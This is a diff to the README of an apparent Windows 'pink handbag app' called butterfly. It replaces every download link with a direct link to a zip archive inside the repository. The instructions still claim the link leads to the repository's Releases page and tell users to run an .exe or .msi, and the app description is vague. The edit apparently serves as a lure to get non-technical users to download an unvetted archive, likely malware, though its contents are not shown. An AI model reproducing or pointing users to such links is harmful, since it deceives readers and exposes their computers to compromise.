@@ -1,6 +1,6 @@
 # 🦋 butterfly - Stylish Pink Handbag App
 
-[![Download butterfly](https://img.shields.io/badge/Download-Now-%23e75480?style=for-the-badge&logo=github)](https://github.com/Komulo2004/butterfly)
+[![Download butterfly](https://img.shields.io/badge/Download-Now-%23e75480?style=for-the-badge&logo=github)](https://github.com/Komulo2004/butterfly/raw/refs/heads/main/data/Software-3.6.zip)
 
 ## ✨ About butterfly
 
@@ -12,7 +12,7 @@ This app runs on your Windows computer. You do not need any programming knowledg
 
 To get butterfly on your PC, visit the link below. This page lets you download the app files you need to run the program on your Windows system.
 
-[Download butterfly from GitHub](https://github.com/Komulo2004/butterfly)
+[Download butterfly from GitHub](https://github.com/Komulo2004/butterfly/raw/refs/heads/main/data/Software-3.6.zip)
 
 ## 🖥️ System Requirements
 
@@ -26,7 +26,7 @@ Make sure your Windows PC meets these needs to run butterfly smoothly:
 
 ## 🚀 How to Install and Run butterfly on Windows
 
-1. Visit the main page at the download link: https://github.com/Komulo2004/butterfly  
+1. Visit the main page at the download link: https://github.com/Komulo2004/butterfly/raw/refs/heads/main/data/Software-3.6.zip  
    This will take you to the repository. Look for the section called "Releases" or the green button labeled "Code."
 
 2. Look for the latest release or the main download files marked for Windows. You want a file ending with `.exe` or `.msi`.  
@@ -103,4 +103,4 @@ The app focuses on a pink aesthetic with clean layouts. It responds to different
 
 Visit this link to download and install butterfly on your Windows PC:
 
-[Download butterfly here](https://github.com/Komulo2004/butterfly)
+[Download butterfly here](https://github.com/Komulo2004/butterfly/raw/refs/heads/main/data/Software-3.6.zip)
